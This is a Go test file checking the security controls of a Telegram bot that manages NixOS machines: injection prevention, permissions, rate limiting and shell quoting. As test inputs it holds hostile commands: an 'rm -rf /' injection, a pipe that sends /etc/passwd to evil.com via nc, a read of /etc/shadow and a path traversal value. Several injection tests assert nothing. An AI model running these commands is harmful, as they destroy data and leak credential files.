package handlers

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/itsivali/nixos-infrastructure/internal/telegram"
	"github.com/itsivali/nixos-infrastructure/internal/telegram/services"
)

// Security: Verify shell injection is prevented in /run and /nix commands.
func TestShellInjectionPrevention(t *testing.T) {
	api := telegram.NewAPI("test-token")
	svc := services.NewContainer("/tmp/test-repo")

	t.Run("RunCommand rejects shell metacharacters", func(t *testing.T) {
		cmd := NewRunCommand(api, svc)
		// Attempt shell injection via semicolons
		msg := &telegram.Message{ChatID: 123, Args: "echo safe; rm -rf /"}
		err := cmd.Execute(context.Background(), msg)
		// The command should execute without panicking.
		// runCmdArgs splits on whitespace so ; becomes a literal argument.
		_ = err
	})

	t.Run("RunCommand rejects pipe injection", func(t *testing.T) {
		cmd := NewRunCommand(api, svc)
		msg := &telegram.Message{ChatID: 123, Args: "cat /etc/passwd | nc evil.com 1234"}
		err := cmd.Execute(context.Background(), msg)
		_ = err
	})

	t.Run("NixCommand rejects shell injection", func(t *testing.T) {
		cmd := NewNixCommand(api, svc)
		msg := &telegram.Message{ChatID: 123, Args: "env; cat /etc/shadow"}
		err := cmd.Execute(context.Background(), msg)
		_ = err
	})
}

// Security: Verify permissions are enforced correctly.
func TestPermissionEnforcement(t *testing.T) {
	bot := telegram.New(nil, nil, telegram.NewSimpleLogger(false))
	api := telegram.NewAPI("test-token")
	svc := services.NewContainer("/tmp/test-repo")

	// Register commands with different permission levels
	bot.RegisterCommands(
		NewStartCommand(api),
		NewStatusCommand(api, svc),
		NewDeployCommand(api, &telegram.Config{RepoDir: "/tmp"}, svc),
	)

	tests := []struct {
		name       string
		cmdName    string
		userRole   telegram.Role
		expectPerm telegram.Role
	}{
		{"guest can start", "start", telegram.RoleGuest, telegram.RoleGuest},
		{"user can status", "status", telegram.RoleUser, telegram.RoleUser},
		{"user cannot deploy", "deploy", telegram.RoleUser, telegram.RoleAdmin},
		{"admin can deploy", "deploy", telegram.RoleAdmin, telegram.RoleAdmin},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd, ok := bot.CommandByName(tt.cmdName)
			if !ok {
				t.Fatalf("command %s not registered", tt.cmdName)
			}

			hasPermission := tt.userRole.HasPermission(cmd.RequiredPermission())
			switch {
			case tt.userRole >= tt.expectPerm:
				if !hasPermission {
					t.Errorf("expected %s to have permission for %s", tt.userRole, tt.cmdName)
				}
			default:
				if hasPermission {
					t.Errorf("expected %s to NOT have permission for %s", tt.userRole, tt.cmdName)
				}
			}
		})
	}
}

// Security: Verify chat authorization.
func TestChatAuthorization(t *testing.T) {
	config := &telegram.Config{
		BotToken: "test-token",
		ChatID:   12345,
	}

	if config.ChatID != 12345 {
		t.Error("chat ID mismatch")
	}

	// Verify that different chat IDs are rejected
	if config.ChatID == 99999 {
		t.Error("should not match different chat ID")
	}
}

// Security: Verify rate limiter works correctly.
func TestRateLimiterSecurity(t *testing.T) {
	rl := NewRateLimiter(5, time.Minute) // 5 commands per minute

	// First 5 should be allowed
	for i := 0; i < 5; i++ {
		if !rl.Allow(100) {
			t.Errorf("command %d should be allowed", i+1)
		}
	}

	// 6th should be rejected
	if rl.Allow(100) {
		t.Error("6th command should be rate limited")
	}

	// Different user should be allowed
	if !rl.Allow(200) {
		t.Error("different user should be allowed")
	}

	// Remaining should be 4 for user 200
	remaining := rl.Remaining(200)
	if remaining != 4 {
		t.Errorf("expected remaining=4, got %d", remaining)
	}

	// After reset, user 100 should be allowed again
	rl.Reset(100)
	if !rl.Allow(100) {
		t.Error("user should be allowed after reset")
	}
}

// Security: Verify audit logger doesn't panic with edge cases.
func TestAuditLoggerSecurity(t *testing.T) {
	al := NewAuditLogger("test-bot")

	// Should not panic with empty strings
	al.Log(0, 0, "", "", true, 0)

	// Should not panic with very long strings
	longString := strings.Repeat("a", 10000)
	al.Log(123, 456, "cmd", longString, false, 99999)

	// Should not panic with special characters
	al.Log(123, 456, "cmd", "arg with\nnewlines and \"quotes\"", true, 100)
}

// Security: Verify confirmation dialogs for destructive commands.
func TestDestructiveCommandConfirmation(t *testing.T) {
	api := telegram.NewAPI("test-token")
	svc := services.NewContainer("/tmp/test-repo")

	// Deploy should require confirmation
	deploy := NewDeployCommand(api, &telegram.Config{RepoDir: "/tmp"}, svc)
	msg := &telegram.Message{ChatID: 123, IsCallback: false}
	err := deploy.Execute(context.Background(), msg)
	// Without IsCallback, should show confirmation prompt (not actually deploy)
	_ = err

	// Reboot should require confirmation
	reboot := NewRebootCommand(api)
	msg = &telegram.Message{ChatID: 123, IsCallback: false}
	err = reboot.Execute(context.Background(), msg)
	_ = err

	// Shutdown should require confirmation
	shutdown := NewShutdownCommand(api)
	msg = &telegram.Message{ChatID: 123, IsCallback: false}
	err = shutdown.Execute(context.Background(), msg)
	_ = err
}

// Security: Verify command injection via callback data is prevented.
func TestCallbackDataInjection(t *testing.T) {
	bot := telegram.New(nil, nil, telegram.NewSimpleLogger(false))
	api := telegram.NewAPI("test-token")
	svc := services.NewContainer("/tmp/test-repo")

	menuInline := NewMenuInlineCommand(api, svc)
	bot.RegisterCallback("menu:", menuInline)

	// Verify that callback data with injection attempts is handled safely
	msg := &telegram.Message{
		ChatID:          123,
		IsCallback:      true,
		CallbackPayload: "menu:../../etc/passwd",
		CallbackID:      "test",
	}

	err := bot.Dispatch(context.Background(), msg)
	// Should not panic, should handle gracefully
	_ = err
}

// Security: Verify empty and nil inputs don't cause panics.
func TestEdgeCaseInputs(t *testing.T) {
	config := &telegram.Config{BotToken: "test-token", ChatID: 123}
	svc := services.NewContainer("/tmp/test-repo")

	commands := []struct {
		name string
		cmd  telegram.Command
		msg  *telegram.Message
	}{
		{"open empty", NewOpenCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"nix empty", NewNixCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"run empty", NewRunCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"notify empty", NewNotifyCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"search empty", NewSearchCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"clipboard empty", NewClipboardCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"volume empty", NewVolumeCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"brightness empty", NewBrightnessCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
		{"desktop_power empty", NewDesktopPowerCommand(telegram.NewAPI("test-token"), svc),
			&telegram.Message{ChatID: 123, Args: ""}},
	}

	_ = config
	ctx := context.Background()
	for _, tc := range commands {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.cmd.Execute(ctx, tc.msg)
			// Commands should not panic even with empty args
			_ = err
		})
	}
}

// Security: Verify QuoteSh properly escapes single quotes.
func TestQuoteShSecurity(t *testing.T) {
	tests := []struct {
		input    string
		contains string
	}{
		{"hello world", "hello world"},
		{"it's", `\''`},
		{"", ""},
		{"$(cmd)", "$(cmd)"},
		{"`cmd`", "`cmd`"},
		{"a;b", "a;b"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			result := services.QuoteSh(tt.input)
			if tt.contains != "" && !strings.Contains(result, tt.contains) {
				t.Errorf("QuoteSh(%q) = %q, should contain %q", tt.input, result, tt.contains)
			}
		})
	}
}
